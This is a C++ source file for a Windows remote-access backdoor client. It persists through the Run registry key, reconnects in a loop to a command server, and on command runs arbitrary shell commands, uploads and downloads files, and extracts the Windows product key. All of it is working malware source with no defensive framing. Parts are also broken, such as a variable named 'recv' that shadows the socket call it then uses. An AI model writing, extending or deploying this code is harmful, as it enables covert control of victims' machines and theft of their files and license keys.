#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00

#include <winsock2.h>
#include <windows.h>
#include <winreg.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <tchar.h>
#include <thread>
#include <chrono>
#include <iostream>
#include <fstream>
#include <sstream>
#include <utility>
#include <vector>
#include <cstdio>  // For _popen, _pclose


#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 9999
#define BUFFER_SIZE 4096

void addToStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "CppClient", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

std::string getWindowsKey() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) {
        return "Failed to open registry.";
    }

    BYTE digitalProductId[256];
    DWORD size = sizeof(digitalProductId);
    if (RegQueryValueExA(hKey, "DigitalProductId", NULL, NULL, digitalProductId, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return "Failed to read product ID.";
    }

    RegCloseKey(hKey);

    const char* keyChars = "BCDFGHJKMPQRTVWXY2346789";
    BYTE* pId = digitalProductId + 52;
    std::string key;
    int isN = (pId[14] / 6) & 1;
    pId[14] &= 0xF7;
    for (int i = 24; i >= 0; i--) {
        int current = 0;
        for (int j = 14; j >= 0; j--) {
            current = current * 256 ^ pId[j];
            pId[j] = current / 24;
            current %= 24;
        }
        key.insert(0, 1, keyChars[current]);
        if (i % 5 == 0 && i != 0) key.insert(0, 1, '-');
    }
    return key;
}

std::pair<double, double> getNetworkSpeed() {
    MIB_IFROW row;
    row.dwIndex = 1;
    GetIfEntry(&row);
    ULONG sent1 = row.dwOutOctets;
    ULONG recv1 = row.dwInOctets;

    std::this_thread::sleep_for(std::chrono::seconds(1));
    GetIfEntry(&row);
    ULONG sent2 = row.dwOutOctets;
    ULONG recv2 = row.dwInOctets;

    return {
        static_cast<double>(sent2 - sent1) / 1024.0,
        static_cast<double>(recv2 - recv1) / 1024.0
    };
}

void uploadFile(SOCKET sock, const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) return;

    std::string filename = filepath.substr(filepath.find_last_of("\\/") + 1);
    std::string header = "UPLOAD:" + filename;
    send(sock, header.c_str(), header.size(), 0);

    char buffer[BUFFER_SIZE];
    while (file.read(buffer, sizeof(buffer))) {
        send(sock, buffer, file.gcount(), 0);
    }
    if (file.gcount() > 0) send(sock, buffer, file.gcount(), 0);
    send(sock, "EOF", 3, 0);
}

void downloadFile(SOCKET sock, const std::string& filename) {
    std::string request = "DOWNLOAD:" + filename;
    send(sock, request.c_str(), request.size(), 0);

    std::ofstream file("downloaded_" + filename, std::ios::binary);
    char buffer[BUFFER_SIZE];
    int bytes;
    while ((bytes = recv(sock, buffer, BUFFER_SIZE, 0)) > 0) {
        if (bytes == 3 && strncmp(buffer, "EOF", 3) == 0) break;
        file.write(buffer, bytes);
    }
    file.close();
}

std::string execCommand(const std::string& cmd) {
    char buffer[128];
    std::string result;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "popen failed!";
    while (fgets(buffer, sizeof(buffer), pipe)) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

void handleClient() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock;
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    while (true) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        // Send OS info
        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
        GetVersionExA((OSVERSIONINFOA*)&osvi);
        std::stringstream osDetails;
        osDetails << "OS: Windows " << (int)osvi.dwMajorVersion << "." << (int)osvi.dwMinorVersion;
        send(sock, osDetails.str().c_str(), osDetails.str().length(), 0);

        char buffer[1024];
        while (true) {
            auto [sent, recv] = getNetworkSpeed();
            std::stringstream speedMsg;
            speedMsg << "Speed: " << sent << " KB/s up, " << recv << " KB/s down";
            send(sock, speedMsg.str().c_str(), speedMsg.str().length(), 0);

            int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) break;
            buffer[bytes] = '\0';
            std::string command(buffer);

            if (command == "exit") break;
            else if (command == "get_key") {
                std::string key = "Windows Key: " + getWindowsKey();
                send(sock, key.c_str(), key.length(), 0);
            }
            else if (command.rfind("shell:", 0) == 0) {
                std::string output = execCommand(command.substr(6));
                send(sock, output.c_str(), output.size(), 0);
            }
            else if (command.rfind("upload:", 0) == 0) {
                uploadFile(sock, command.substr(7));
            }
            else if (command.rfind("download:", 0) == 0) {
                downloadFile(sock, command.substr(9));
            }
        }

        closesocket(sock);
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    WSACleanup();
}

int main() {
    addToStartup();
    handleClient();
    return 0;
}
